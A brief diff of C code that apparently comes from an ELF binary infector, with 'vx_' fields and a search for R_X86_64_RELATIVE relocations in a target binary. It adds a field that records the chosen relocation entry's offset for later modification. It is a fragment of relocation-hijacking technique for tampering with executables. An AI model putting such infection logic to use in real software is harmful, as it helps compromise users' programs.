@@ -63,6 +63,9 @@ typedef struct elfbin {
 
 	uint64_t vx_vaddr;
 	uint64_t vx_offset;
+
+	uint64_t desired_rela_offset;
+
 }Elfbin;
 
 extern unsigned long real_start;
@@ -344,6 +347,9 @@ bool has_R_X86_64_RELATIVE(Elfbin *target, Elf64_Rela *desired_reloc)
 				desired_reloc->r_offset = reloc_entry[r].r_offset;
 				desired_reloc->r_info = reloc_entry[r].r_info;
 				desired_reloc->r_addend = reloc_entry[r].r_addend;
+
+				//take note where to find this offset for modification later.
+				target->desired_rela_offset = r * rela_sz;
 				return true;
 			}
 		}
